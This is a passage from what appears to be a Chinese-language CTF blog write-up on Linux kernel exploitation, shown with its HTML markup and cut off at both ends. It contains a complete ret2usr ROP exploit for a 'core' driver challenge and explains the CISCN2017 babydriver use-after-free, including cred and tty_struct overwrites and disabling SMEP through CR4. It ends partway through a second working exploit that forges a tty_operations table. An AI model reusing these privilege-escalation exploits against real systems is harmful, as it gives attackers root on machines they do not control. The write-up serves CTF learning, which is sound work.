class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stropts.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;wait.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;stat.h&gt;</span><br><span class="line"></span><br><span class="line">void spawn_shell()</span><br><span class="line">&#123;</span><br><span class="line">    if(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        puts(&quot;[*]spawn shell error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">size_t commit_creds &#x3D; 0x9c8e0;</span><br><span class="line">size_t prepare_kernel_cred &#x3D; 0x9cce0;</span><br><span class="line">size_t raw_vmlinux &#x3D; 0xffffffff81000000;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; intel flavor assembly</span><br><span class="line">size_t user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line">void save_status()&#123;</span><br><span class="line">    __asm__(&quot;mov user_cs, cs;&quot;</span><br><span class="line">            &quot;mov user_ss, ss;&quot;</span><br><span class="line">            &quot;mov user_sp, rsp;&quot;</span><br><span class="line">            &quot;pushf;&quot;</span><br><span class="line">            &quot;pop user_rflags;&quot;</span><br><span class="line">            );</span><br><span class="line">    puts(&quot;[*]status has been saved.&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void core_read(int fd,char* buf)&#123;</span><br><span class="line">    ioctl(fd,0x6677889B,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void set_off(int fd,int off)&#123;</span><br><span class="line">    ioctl(fd,0x6677889C,off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void core_copy_func(int fd,size_t size)&#123;</span><br><span class="line">    ioctl(fd,0x6677889A,size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void root(size_t vmlinux_base)&#123;</span><br><span class="line">    void* (*a)(int);</span><br><span class="line">    void* (*b)(size_t);</span><br><span class="line">    a &#x3D; prepare_kernel_cred+vmlinux_base;</span><br><span class="line">    b &#x3D; commit_creds+vmlinux_base;</span><br><span class="line">    (*b)((*a)(0));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    int fd &#x3D; open(&quot;&#x2F;proc&#x2F;core&quot;,2);</span><br><span class="line">    if(fd &#x3D;&#x3D; -1)&#123;</span><br><span class="line">        printf(&quot;fd: %d&quot;,fd);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;*leak*&#x2F;</span><br><span class="line">    size_t buf[0x100] &#x3D; &#123;0&#125;;</span><br><span class="line">    set_off(fd,0x40);</span><br><span class="line">    core_read(fd,buf);</span><br><span class="line">    for(int i&#x3D;0;i&lt;8;i++)&#123;</span><br><span class="line">        printf(&quot;buf[%d]: &quot;,i);</span><br><span class="line">        printf(&quot;%p\n&quot;,buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    size_t canary &#x3D; buf[0];</span><br><span class="line">    size_t vmlinux_base &#x3D; buf[7] - 0x18ECFA;</span><br><span class="line">    size_t ko_base &#x3D; buf[2] - 0x19B;</span><br><span class="line">    printf(&quot;canary:%p\n&quot;,canary);</span><br><span class="line">    printf(&quot;vmlinux_base:%p\n&quot;,vmlinux_base);</span><br><span class="line">    printf(&quot;ko_base:%p\n&quot;,ko_base);</span><br><span class="line">    &#x2F;*leak end*&#x2F;</span><br><span class="line"></span><br><span class="line">    size_t rop[0x100] &#x3D; &#123;0&#125;;</span><br><span class="line">    int i;</span><br><span class="line">    for(i&#x3D;0;i&lt;10;i++)</span><br><span class="line">        rop[i] &#x3D; canary;</span><br><span class="line">    size_t offset &#x3D; vmlinux_base - raw_vmlinux;</span><br><span class="line">    rop[i++] &#x3D; (size_t)root; &#x2F;&#x2F;调用用户态函数</span><br><span class="line">    rop[i++] &#x3D; 0xffffffff81a012da + offset; &#x2F;&#x2F; swapgs; popfq; ret</span><br><span class="line">    rop[i++] &#x3D; 0;</span><br><span class="line"></span><br><span class="line">    rop[i++] &#x3D; 0xffffffff81050ac2 + offset; &#x2F;&#x2F; iretq; ret; </span><br><span class="line"></span><br><span class="line">    rop[i++] &#x3D; (size_t)spawn_shell;         &#x2F;&#x2F; rip </span><br><span class="line"></span><br><span class="line">    rop[i++] &#x3D; user_cs;</span><br><span class="line">    rop[i++] &#x3D; user_rflags;</span><br><span class="line">    rop[i++] &#x3D; user_sp;</span><br><span class="line">    rop[i++] &#x3D; user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd,rop,sizeof(rop));</span><br><span class="line">    core_copy_func(fd,0xFFFFFFFFFFFF0100);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CISCN2017-babydriver-之-UAF-amp-amp-bypass-smep"><a href="#CISCN2017-babydriver-之-UAF-amp-amp-bypass-smep" class="headerlink" title="CISCN2017 - babydriver 之 UAF &amp;&amp; bypass-smep"></a>CISCN2017 - babydriver 之 UAF &amp;&amp; bypass-smep</h2><h3 id="smep-和-CR4-寄存器"><a href="#smep-和-CR4-寄存器" class="headerlink" title="smep 和 CR4 寄存器"></a>smep 和 CR4 寄存器</h3><p>这题开启了smep保护，意味着我们不能在内核中执行用户空间的代码，但是我们可以关掉这个保护，从而使得rop变得简单</p>
+<p>系统根据 CR4 寄存器的值判断是否开启 smep 保护，当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p>
+<p>搜索一下从 vmlinux 中提取出的 gadget，很容易就能达到这个目的。</p>
+<p>gdb 无法查看 cr4 寄存器的值，可以通过 kernel crash 时的信息查看。为了关闭 smep 保护，常用一个固定值 0x6f0，即 mov cr4, 0x6f0。</p>
+<h3 id="漏洞挖掘-1"><a href="#漏洞挖掘-1" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>程序注册了一个叫 /dev/babydev 的设备，并绑定了babyrelease、babyopen、babyioctl、babywrite、babyread这几个函数。</p>
+<p>在babyopen()中会分配0x40的堆并将堆地址保存至babydev_struct.device_buf。</p>
+<p>babyioctl()会释放babydev_struct.device_buf保存的堆空间，并重新分配一段用户自定义大小的堆并保存在其中。</p>
+<p>babyrelease()会释放babydev_struct.device_buf保存的堆空间。</p>
+<p>babyread()和babywrite()分别对这款堆空间进行读写。</p>
+<p>这里存在一个伪条件竞争引发的 UAF 漏洞。</p>
+<p>也就是说如果我们同时打开两个设备，第二次会覆盖第一次分配的空间，因为 babydev_struct 是全局的。同样，如果释放第一个，那么第二个其实是被是释放过的，这样就造成了一个 UAF。</p>
+<h3 id="漏洞利用之-修改-cred-结构体"><a href="#漏洞利用之-修改-cred-结构体" class="headerlink" title="漏洞利用之 修改 cred 结构体"></a>漏洞利用之 修改 cred 结构体</h3><h4 id="总体思路-1"><a href="#总体思路-1" class="headerlink" title="总体思路"></a>总体思路</h4><ul>
+<li><p>打开两次设备，通过 babyioctl 更改其大小为 cred 结构体的大小</p>
+</li>
+<li><p>close其中一个，然后 fork 一个新进程，那么这个新进程的 cred 的空间就会和之前释放的空间重叠</p>
+</li>
+<li><p>同时，我们可以通过另一个文件描述符对这块空间写，只需要将 uid，gid 改为 0，即可以实现提权到 root</p>
+</li>
+</ul>
+<p>cred结构体定于如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">struct cred &#123;</span><br><span class="line">    atomic_t    usage;</span><br><span class="line">#ifdef CONFIG_DEBUG_CREDENTIALS</span><br><span class="line">    atomic_t    subscribers;    &#x2F;* number of processes subscribed *&#x2F;</span><br><span class="line">    void        *put_addr;</span><br><span class="line">    unsigned    magic;</span><br><span class="line">#define CRED_MAGIC  0x43736564</span><br><span class="line">#define CRED_MAGIC_DEAD 0x44656144</span><br><span class="line">#endif</span><br><span class="line">    kuid_t      uid;        &#x2F;* real UID of the task *&#x2F;</span><br><span class="line">    kgid_t      gid;        &#x2F;* real GID of the task *&#x2F;</span><br><span class="line">    kuid_t      suid;       &#x2F;* saved UID of the task *&#x2F;</span><br><span class="line">    kgid_t      sgid;       &#x2F;* saved GID of the task *&#x2F;</span><br><span class="line">    kuid_t      euid;       &#x2F;* effective UID of the task *&#x2F;</span><br><span class="line">    kgid_t      egid;       &#x2F;* effective GID of the task *&#x2F;</span><br><span class="line">    kuid_t      fsuid;      &#x2F;* UID for VFS ops *&#x2F;</span><br><span class="line">    kgid_t      fsgid;      &#x2F;* GID for VFS ops *&#x2F;</span><br><span class="line">    unsigned    securebits; &#x2F;* SUID-less security management *&#x2F;</span><br><span class="line">    kernel_cap_t    cap_inheritable; &#x2F;* caps our children can inherit *&#x2F;</span><br><span class="line">    kernel_cap_t    cap_permitted;  &#x2F;* caps we&#39;re permitted *&#x2F;</span><br><span class="line">    kernel_cap_t    cap_effective;  &#x2F;* caps we can actually use *&#x2F;</span><br><span class="line">    kernel_cap_t    cap_bset;   &#x2F;* capability bounding set *&#x2F;</span><br><span class="line">    kernel_cap_t    cap_ambient;    &#x2F;* Ambient capability set *&#x2F;</span><br><span class="line">#ifdef CONFIG_KEYS</span><br><span class="line">    unsigned char   jit_keyring;    &#x2F;* default keyring to attach requested</span><br><span class="line">                     * keys to *&#x2F;</span><br><span class="line">    struct key __rcu *session_keyring; &#x2F;* keyring inherited over fork *&#x2F;</span><br><span class="line">    struct key  *process_keyring; &#x2F;* keyring private to this process *&#x2F;</span><br><span class="line">    struct key  *thread_keyring; &#x2F;* keyring private to this thread *&#x2F;</span><br><span class="line">    struct key  *request_key_auth; &#x2F;* assumed request_key authority *&#x2F;</span><br><span class="line">#endif</span><br><span class="line">#ifdef CONFIG_SECURITY</span><br><span class="line">    void        *security;  &#x2F;* subjective LSM security *&#x2F;</span><br><span class="line">#endif</span><br><span class="line">    struct user_struct *user;   &#x2F;* real user ID subscription *&#x2F;</span><br><span class="line">    struct user_namespace *user_ns; &#x2F;* user_ns the caps and keyrings are relative to. *&#x2F;</span><br><span class="line">    struct group_info *group_info;  &#x2F;* supplementary groups for euid&#x2F;fsgid *&#x2F;</span><br><span class="line">    struct rcu_head rcu;        &#x2F;* RCU deletion hook *&#x2F;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="确定cred结构体大小"><a href="#确定cred结构体大小" class="headerlink" title="确定cred结构体大小"></a>确定cred结构体大小</h4><p>在打ctf的时候如何确定各种结构体的大小一直困扰着我。。。就算是有源码。。。好在对于linux内核的内存管理机制是向上对齐的大小不必太准确。</p>
+<p>haivk师傅介绍的一种查看cred结构体大小的方法：</p>
+<p>先查看这个函数的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;kallsyms | grep cred_init</span><br></pre></td></tr></table></figure>
+<p>然后通过IDA打开vmlinux 搜索地址，查看源码可以知道这里有cred结构的大小</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* </span><br><span class="line"> * initialise the credentials stuff </span><br><span class="line"> *&#x2F;  </span><br><span class="line">void __init cred_init(void)  </span><br><span class="line">&#123;  </span><br><span class="line">    &#x2F;* allocate a slab in which we can store credentials *&#x2F;  </span><br><span class="line">    cred_jar &#x3D; kmem_cache_create(&quot;cred_jar&quot;, sizeof(struct cred), 0,  </span><br><span class="line">            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="漏洞利用之-修改-tty-struct-结构体"><a href="#漏洞利用之-修改-tty-struct-结构体" class="headerlink" title="漏洞利用之 修改 tty_struct 结构体"></a>漏洞利用之 修改 tty_struct 结构体</h3><p>同样是利用uaf，这次是控制一个 tty_struct 结构，在 open(“/dev/ptmx”, O_RDWR) 时会分配这样一个结构体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">struct tty_struct &#123;</span><br><span class="line">	int	magic;</span><br><span class="line">	struct kref kref;</span><br><span class="line">	struct device *dev;</span><br><span class="line">	struct tty_driver *driver;</span><br><span class="line">	const struct tty_operations *ops;</span><br><span class="line">	int index;</span><br><span class="line"></span><br><span class="line">	&#x2F;* Protects ldisc changes: Lock tty not pty *&#x2F;</span><br><span class="line">	struct ld_semaphore ldisc_sem;</span><br><span class="line">	struct tty_ldisc *ldisc;</span><br><span class="line"></span><br><span class="line">	struct mutex atomic_write_lock;</span><br><span class="line">	struct mutex legacy_mutex;</span><br><span class="line">	struct mutex throttle_mutex;</span><br><span class="line">	struct rw_semaphore termios_rwsem;</span><br><span class="line">	struct mutex winsize_mutex;</span><br><span class="line">	spinlock_t ctrl_lock;</span><br><span class="line">	spinlock_t flow_lock;</span><br><span class="line">	&#x2F;* Termios values are protected by the termios rwsem *&#x2F;</span><br><span class="line">	struct ktermios termios, termios_locked;</span><br><span class="line">	struct termiox *termiox;	&#x2F;* May be NULL for unsupported *&#x2F;</span><br><span class="line">	char name[64];</span><br><span class="line">	struct pid *pgrp;		&#x2F;* Protected by ctrl lock *&#x2F;</span><br><span class="line">	struct pid *session;</span><br><span class="line">	unsigned long flags;</span><br><span class="line">	int count;</span><br><span class="line">	struct winsize winsize;		&#x2F;* winsize_mutex *&#x2F;</span><br><span class="line">	unsigned long stopped:1,	&#x2F;* flow_lock *&#x2F;</span><br><span class="line">		      flow_stopped:1,</span><br><span class="line">		      unused:BITS_PER_LONG - 2;</span><br><span class="line">	int hw_stopped;</span><br><span class="line">	unsigned long ctrl_status:8,	&#x2F;* ctrl_lock *&#x2F;</span><br><span class="line">		      packet:1,</span><br><span class="line">		      unused_ctrl:BITS_PER_LONG - 9;</span><br><span class="line">	unsigned int receive_room;	&#x2F;* Bytes free for queue *&#x2F;</span><br><span class="line">	int flow_change;</span><br><span class="line"></span><br><span class="line">	struct tty_struct *link;</span><br><span class="line">	struct fasync_struct *fasync;</span><br><span class="line">	int alt_speed;		&#x2F;* For magic substitution of 38400 bps *&#x2F;</span><br><span class="line">	wait_queue_head_t write_wait;</span><br><span class="line">	wait_queue_head_t read_wait;</span><br><span class="line">	struct work_struct hangup_work;</span><br><span class="line">	void *disc_data;</span><br><span class="line">	void *driver_data;</span><br><span class="line">	struct list_head tty_files;</span><br><span class="line"></span><br><span class="line">#define N_TTY_BUF_SIZE 4096</span><br><span class="line"></span><br><span class="line">	int closing;</span><br><span class="line">	unsigned char *write_buf;</span><br><span class="line">	int write_cnt;</span><br><span class="line">	&#x2F;* If the tty has a pending do_SAK, queue it here - akpm *&#x2F;</span><br><span class="line">	struct work_struct SAK_work;</span><br><span class="line">	struct tty_port *port;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>其中有一个叫 tty_operations 的结构体指针，看这名字就觉得里面有一些函数指针</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">struct tty_operations &#123;</span><br><span class="line">	struct tty_struct * (*lookup)(struct tty_driver *driver,</span><br><span class="line">			struct inode *inode, int idx);</span><br><span class="line">	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">	int  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">	void (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">	void (*shutdown)(struct tty_struct *tty);</span><br><span class="line">	void (*cleanup)(struct tty_struct *tty);</span><br><span class="line">	int  (*write)(struct tty_struct * tty,</span><br><span class="line">		      const unsigned char *buf, int count);</span><br><span class="line">	int  (*put_char)(struct tty_struct *tty, unsigned char ch);</span><br><span class="line">	void (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">	int  (*write_room)(struct tty_struct *tty);</span><br><span class="line">	int  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">	int  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">		    unsigned int cmd, unsigned long arg);</span><br><span class="line">	long (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">			     unsigned int cmd, unsigned long arg);</span><br><span class="line">	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">	void (*throttle)(struct tty_struct * tty);</span><br><span class="line">	void (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">	void (*stop)(struct tty_struct *tty);</span><br><span class="line">	void (*start)(struct tty_struct *tty);</span><br><span class="line">	void (*hangup)(struct tty_struct *tty);</span><br><span class="line">	int (*break_ctl)(struct tty_struct *tty, int state);</span><br><span class="line">	void (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">	void (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">	void (*wait_until_sent)(struct tty_struct *tty, int timeout);</span><br><span class="line">	void (*send_xchar)(struct tty_struct *tty, char ch);</span><br><span class="line">	int (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">	int (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">			unsigned int set, unsigned int clear);</span><br><span class="line">	int (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">	int (*get_icount)(struct tty_struct *tty,</span><br><span class="line">				struct serial_icounter_struct *icount);</span><br><span class="line">#ifdef CONFIG_CONSOLE_POLL</span><br><span class="line">	int (*poll_init)(struct tty_driver *driver, int line, char *options);</span><br><span class="line">	int (*poll_get_char)(struct tty_driver *driver, int line);</span><br><span class="line">	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);</span><br><span class="line">#endif</span><br><span class="line">	const struct file_operations *proc_fops;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>果然里面有对ptmx设备进行操作的对应函数指针，类似于libc pwn中的vtable</p>
+<p>通过 UAF 伪造了这俩结构然后就可以控制程序流了</p>
+<p>想要提权执行 commit_creds(prepare_kernel_cred(0)) 还是要写rop的，通过调试发现在对ptmx设备进行write操作时、也就是执行tty_operations中的第8个函数指针时，rax的值正好是tty_operations结构体的地址 也就是我们伪造的、可以控制的地址</p>
+<p>先通过 <strong>mov rsp, rax</strong> 这个gadget把栈迁移到tty_operations上，然后再迁移到我们在用户空间写的rop上，修改rc4寄存器后ret2usr提权（这里不用ret2usr直接在内核中写rop应该也行</p>
+<h3 id="exp-bypass-smep"><a href="#exp-bypass-smep" class="headerlink" title="exp-bypass-smep"></a>exp-bypass-smep</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stropts.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;wait.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;stat.h&gt;</span><br><span class="line"></span><br><span class="line">void spawn_shell()</span><br><span class="line">&#123;</span><br><span class="line">    if(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        puts(&quot;[*]spawn shell error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">size_t commit_creds &#x3D; 0xffffffff810a1420;</span><br><span class="line">size_t prepare_kernel_cred &#x3D; 0xffffffff810a1810;</span><br><span class="line">size_t raw_vmlinux &#x3D; 0xffffffff81000000;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; intel flavor assembly</span><br><span class="line">size_t user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line">void save_status()&#123;</span><br><span class="line">    __asm__(&quot;mov user_cs, cs;&quot;</span><br><span class="line">            &quot;mov user_ss, ss;&quot;</span><br><span class="line">            &quot;mov user_sp, rsp;&quot;</span><br><span class="line">            &quot;pushf;&quot;</span><br><span class="line">            &quot;pop user_rflags;&quot;</span><br><span class="line">            );</span><br><span class="line">    puts(&quot;[*]status has been saved.&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void root()&#123;</span><br><span class="line">    void* (*a)(int);</span><br><span class="line">    void* (*b)(size_t);</span><br><span class="line">    a &#x3D; prepare_kernel_cred;</span><br><span class="line">    b &#x3D; commit_creds;</span><br><span class="line">    (*b)((*a)(0));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    int fd1 &#x3D; open(&quot;&#x2F;dev&#x2F;babydev&quot;,2);</span><br><span class="line">    int fd2 &#x3D; open(&quot;&#x2F;dev&#x2F;babydev&quot;,2);</span><br><span class="line">    if(fd1 &lt; 0 || fd2 &lt; 0)&#123;</span><br><span class="line">        printf(&quot;open error fd: %d&quot;,fd1);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    size_t rop[0x100] &#x3D; &#123;0&#125;;</span><br><span class="line">    int i &#x3D; 0;</span><br><span class="line">    rop[i++] &#x3D; 0xffffffff810d238d; &#x2F;&#x2F; pop rdi ; ret</span><br><span class="line">    rop[i++] &#x3D; 0x6f0;</span><br><span class="line">    rop[i++] &#x3D; 0xffffffff81004d80; &#x2F;&#x2F; mov cr4, rdi; pop rbp; ret;</span><br><span class="line">    rop[i++] &#x3D; 0;</span><br><span class="line">    rop[i++] &#x3D; (size_t)root;</span><br><span class="line">    rop[i++] &#x3D; 0xffffffff81063694; &#x2F;&#x2F; swapgs; pop rbp; ret;</span><br><span class="line">    rop[i++] &#x3D; 0;</span><br><span class="line">    rop[i++] &#x3D; 0xffffffff814e35ef; &#x2F;&#x2F; iretq; ret; </span><br><span class="line">    rop[i++] &#x3D; (size_t)spawn_shell;         &#x2F;&#x2F; rip </span><br><span class="line">    rop[i++] &#x3D; user_cs;</span><br><span class="line">    rop[i++] &#x3D; user_rflags;</span><br><span class="line">    rop[i++] &#x3D; user_sp;</span><br><span class="line">    rop[i++] &#x3D; user_ss;</span><br><span class="line"></span><br><span class="line">    ioctl(fd1,0x10001,0x2e0);</span><br><span class="line">    close(fd1);</span><br><span class="line">    int fd_tty &#x3D; open(&quot;&#x2F;dev&#x2F;ptmx&quot;,O_RDWR|O_NOCTTY);</span><br><span class="line">    size_t fake_tty_struct[4] &#x3D;&#123;0&#125;;</span><br><span class="line">    size_t fake_tty_operations[30];</span><br><span class="line">    read(fd2,fake_tty_struct,sizeof(fake_tty_struct));</span><br><span class="line">    fake_tty_struct[3] &#x3D; fake_tty_operations;</span><br><span class="line">    for(int i &#x3D; 0;i&lt;30;i++)</span><br><span class="line">        fake_tty_operations[i] &#x3D; 0xFFFFFFFF8181BFC5;</span><br><span 